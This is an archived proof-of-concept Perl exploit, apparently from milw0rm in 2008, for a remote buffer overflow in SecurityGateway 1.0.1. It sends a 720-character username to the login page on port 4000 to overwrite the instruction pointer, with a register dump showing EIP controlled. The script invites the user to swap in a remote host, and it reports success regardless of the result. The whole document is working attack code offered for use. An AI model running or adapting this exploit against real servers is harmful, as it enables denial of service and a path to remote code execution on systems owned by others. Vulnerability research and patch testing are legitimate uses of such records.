<html><head><title>SecurityGateway 1.0.1 (username) Remote Buffer Overflow PoC</title></head><pre>##################################################################################################################
# SecurityGateway 1.0.1 Remote Buffer Overflow ( username)
# Vendor: http://www.altn.com/
# risk : critical
#SecurityGateway open port 4000 for remote administration/managment, EIP get owned  when the username field is filled with 720 chars
#
#eax=00000000 ebx=00000000 ecx=63636363 edx=7c9137d8 esi=00000000 edi=00000000
#eip=63636363 esp=042ce910 ebp=042ce930 iopl=0         nv up ei pl zr na pe nc
#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
#63636363 ??              ???
#
# Replace http://127.0.0.1:4000/ with your remote host.

use LWP::UserAgent;
$connect = LWP::UserAgent-&gt;new;
my $payload1 =&quot;a&quot; x 236;
my $payload2 =&quot;b&quot; x 480;
my $eip_owned = &quot;c&quot; x 4;

print &quot;SecurityGateway Remote BoF exploit by securfrog.\n\n&quot;;
my $req = HTTP::Request-&gt;new(POST =&gt; 'http://127.0.0.1:4000/SecurityGateway.dll');
$req-&gt;content_type('application/x-www-form-urlencoded');
$req-&gt;content('RequestedPage=login&amp;username='.$payload2.$eip_owned.$payload1.'&amp;passwd=world&amp;lang=en&amp;logon=Sign+In');
my $res = $connect-&gt;request($req);
print $res-&gt;as_string;
print &quot;Exploit successfull\n&quot;;

# milw0rm.com [2008-06-01]</pre></html>